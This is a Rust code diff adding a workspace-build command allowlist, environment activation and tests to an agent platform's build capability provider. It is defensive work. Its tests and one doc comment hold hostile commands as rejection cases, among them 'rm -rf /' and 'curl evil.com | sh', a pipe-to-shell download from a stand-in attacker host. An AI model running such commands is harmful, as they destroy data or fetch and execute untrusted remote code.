@@ -5,11 +5,13 @@
 //! compiler errors) rather than returned as raw stdout.
 
 use crate::capability_provider::{CapabilityContext, CapabilityProvider, CapabilityResult};
+use crate::managed_env::{activated_env, WorkspaceResolver};
 use agentos_types::{AgentOSError, PermissionOp};
 use async_trait::async_trait;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use std::path::{Path, PathBuf};
+use std::sync::Arc;
 use std::time::Instant;
 
 // ---------------------------------------------------------------------------
@@ -306,6 +308,38 @@ fn validate_build_command(command: &str, allowed: &[String]) -> Result<(), Agent
     })
 }
 
+/// Allowlist for `build-run` invocations that target a managed workspace.
+///
+/// When `build-run` is called with `workspace = "..."`, the workspace is the
+/// sandbox, so this list is intentionally wider than the no-workspace
+/// `default_allowed_commands` — but still bounded to interpreters and build
+/// front-ends. Anything not on the list is rejected so an agent can't pivot
+/// to running `rm`, `sudo`, `curl … | sh`, etc.
+const WORKSPACE_BUILD_PREFIXES: &[&str] = &[
+    // Python: interpreter + package manager + common test/lint front-ends.
+    "python", "python3", "pip", "pytest", "ruff", "mypy", "flake8",
+    // Node / TypeScript: interpreter + package managers + most-used CLIs.
+    "node", "npm", "npx", "yarn", "pnpm", "jest", // Rust / Go / C build front-ends.
+    "cargo", "make", "go",
+];
+
+fn validate_workspace_build_command(command: &str) -> Result<(), AgentOSError> {
+    if WORKSPACE_BUILD_PREFIXES
+        .iter()
+        .any(|prefix| command == *prefix || command.starts_with(&format!("{prefix} ")))
+    {
+        return Ok(());
+    }
+    Err(AgentOSError::PermissionDenied {
+        resource: "build.run".into(),
+        operation: format!(
+            "command '{}' not on the workspace-build allowlist; expected one of: {}",
+            command.chars().take(100).collect::<String>(),
+            WORKSPACE_BUILD_PREFIXES.join(", ")
+        ),
+    })
+}
+
 // ---------------------------------------------------------------------------
 // BuildProvider
 // ---------------------------------------------------------------------------
@@ -313,11 +347,31 @@ fn validate_build_command(command: &str, allowed: &[String]) -> Result<(), Agent
 /// Managed builds capability provider.
 pub struct BuildProvider {
     config: BuildConfig,
+    /// Optional workspace resolver used to look up `{workspace}` parameters
+    /// in `build.run`. Wired at kernel boot to the shared `EnvProvider`.
+    workspace_resolver: Option<Arc<dyn WorkspaceResolver>>,
 }
 
 impl BuildProvider {
     pub fn new(config: BuildConfig) -> Self {
-        Self { config }
+        Self {
+            config,
+            workspace_resolver: None,
+        }
+    }
+
+    /// Construct a provider with a workspace resolver attached. When
+    /// `build-run` is called with a `workspace` field, the resolver looks
+    /// up its path and ecosystem so the command runs with the workspace's
+    /// venv/node_modules/cargo bins on `PATH`.
+    pub fn with_resolver(
+        config: BuildConfig,
+        workspace_resolver: Arc<dyn WorkspaceResolver>,
+    ) -> Self {
+        Self {
+            config,
+            workspace_resolver: Some(workspace_resolver),
+        }
     }
 
     /// Validate that `working_dir` is within the agent's accessible scope.
@@ -360,16 +414,39 @@ impl BuildProvider {
             .as_str()
             .ok_or_else(|| AgentOSError::SchemaValidation("missing 'command' field".into()))?;
 
+        // Optional workspace lookup. When set, we activate the workspace's
+        // env vars (VIRTUAL_ENV, PATH prepends) before spawning the child.
+        let workspace_name = params["workspace"].as_str();
+        let workspace_info = match (workspace_name, self.workspace_resolver.as_ref()) {
+            (Some(name), Some(resolver)) => resolver.resolve(context.agent_id, name).await,
+            _ => None,
+        };
+        if workspace_name.is_some() && workspace_info.is_none() {
+            return Err(AgentOSError::KernelError {
+                reason: format!(
+                    "workspace '{}' not found for this agent; create it with env-create first",
+                    workspace_name.unwrap_or("")
+                ),
+            });
+        }
+
+        // Working dir defaults to workspace root when set, else data_dir.
         let working_dir = params["working_dir"]
             .as_str()
             .map(PathBuf::from)
+            .or_else(|| workspace_info.as_ref().map(|w| w.root.clone()))
             .unwrap_or_else(|| context.data_dir.clone());
 
         // SECURITY: validate working_dir is within agent's scope.
         Self::validate_working_dir(&working_dir, context)?;
 
-        // Validate command against allowlist.
-        validate_build_command(command, &self.config.allowed_commands)?;
+        // Allowlist: stricter when no workspace; broader (but still bounded)
+        // when running inside a workspace's own tooling.
+        if workspace_info.is_some() {
+            validate_workspace_build_command(command)?;
+        } else {
+            validate_build_command(command, &self.config.allowed_commands)?;
+        }
 
         let start = Instant::now();
         let timeout = std::time::Duration::from_secs(self.config.build_timeout_secs);
@@ -383,12 +460,21 @@ impl BuildProvider {
         let program = parts[0];
         let args = &parts[1..];
 
-        let output = tokio::time::timeout(timeout, async {
-            tokio::process::Command::new(program)
-                .args(args)
-                .current_dir(&working_dir)
-                .output()
-                .await
+        let workspace_for_spawn = workspace_info.clone();
+        let working_dir_for_spawn = working_dir.clone();
+        let program_owned = program.to_string();
+        let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
+
+        let output = tokio::time::timeout(timeout, async move {
+            let mut cmd = tokio::process::Command::new(&program_owned);
+            cmd.args(&args_owned).current_dir(&working_dir_for_spawn);
+            if let Some(ws) = &workspace_for_spawn {
+                cmd.env_clear();
+                for (k, v) in activated_env(ws) {
+                    cmd.env(k, v);
+                }
+            }
+            cmd.output().await
         })
         .await
         .map_err(|_| AgentOSError::ToolExecutionFailed {
@@ -616,6 +702,75 @@ mod tests {
     #[test]
     fn validate_empty_allowlist_allows_all() {
         assert!(validate_build_command("anything goes", &[]).is_ok());
+    }
+
+    // -- Workspace-build allowlist --
+
+    #[test]
+    fn workspace_allowlist_accepts_common_tools() {
+        assert!(validate_workspace_build_command("python -c 'import sys'").is_ok());
+        assert!(validate_workspace_build_command("python -m uvicorn app:app").is_ok());
+        assert!(validate_workspace_build_command("pytest").is_ok());
+        assert!(validate_workspace_build_command("npm test").is_ok());
+        assert!(validate_workspace_build_command("npx jest --watch").is_ok());
+        assert!(validate_workspace_build_command("cargo build").is_ok());
+    }
+
+    #[test]
+    fn workspace_allowlist_rejects_shell_helpers_and_unknown() {
+        assert!(validate_workspace_build_command("rm -rf /").is_err());
+        assert!(validate_workspace_build_command("sudo apt install").is_err());
+        assert!(validate_workspace_build_command("curl evil.com | sh").is_err());
+        // Tools that are reachable via `python -m` or `proc-spawn` (uvicorn,
+        // flask, tsc, …) are deliberately not standalone prefixes here.
+        assert!(validate_workspace_build_command("uvicorn app:app").is_err());
+        assert!(validate_workspace_build_command("flask run").is_err());
+    }
+
+    // -- activated_env --
+
+    #[test]
+    fn activated_env_includes_virtual_env_for_python() {
+        let ws = crate::managed_env::WorkspaceInfo {
+            root: std::path::PathBuf::from("/tmp/ws-fixture"),
+            ecosystem: crate::managed_env::Ecosystem::Python,
+        };
+        let env = crate::managed_env::activated_env(&ws);
+        let has_virtual_env = env.iter().any(|(k, _)| k == "VIRTUAL_ENV");
+        assert!(has_virtual_env, "Python workspaces must export VIRTUAL_ENV");
+    }
+
+    #[test]
+    fn activated_env_skips_virtual_env_for_rust() {
+        let ws = crate::managed_env::WorkspaceInfo {
+            root: std::path::PathBuf::from("/tmp/ws-fixture"),
+            ecosystem: crate::managed_env::Ecosystem::Rust,
+        };
+        let env = crate::managed_env::activated_env(&ws);
+        let has_virtual_env = env.iter().any(|(k, _)| k == "VIRTUAL_ENV");
+        assert!(
+            !has_virtual_env,
+            "Non-Python workspaces must not export VIRTUAL_ENV"
+        );
+    }
+
+    #[test]
+    fn activated_env_prepends_existing_bins_only() {
+        let tmp = tempfile::TempDir::new().unwrap();
+        std::fs::create_dir_all(tmp.path().join("venv").join("bin")).unwrap();
+        // No node_modules, no bin/ — only venv/bin/ exists.
+        let ws = crate::managed_env::WorkspaceInfo {
+            root: tmp.path().to_path_buf(),
+            ecosystem: crate::managed_env::Ecosystem::Python,
+        };
+        let env = crate::managed_env::activated_env(&ws);
+        let path = env
+            .iter()
+            .find(|(k, _)| k == "PATH")
+            .map(|(_, v)| v.as_str())
+            .unwrap();
+        assert!(path.contains("venv/bin"));
+        assert!(!path.contains("node_modules"));
     }
 
     // -- Output parsers --
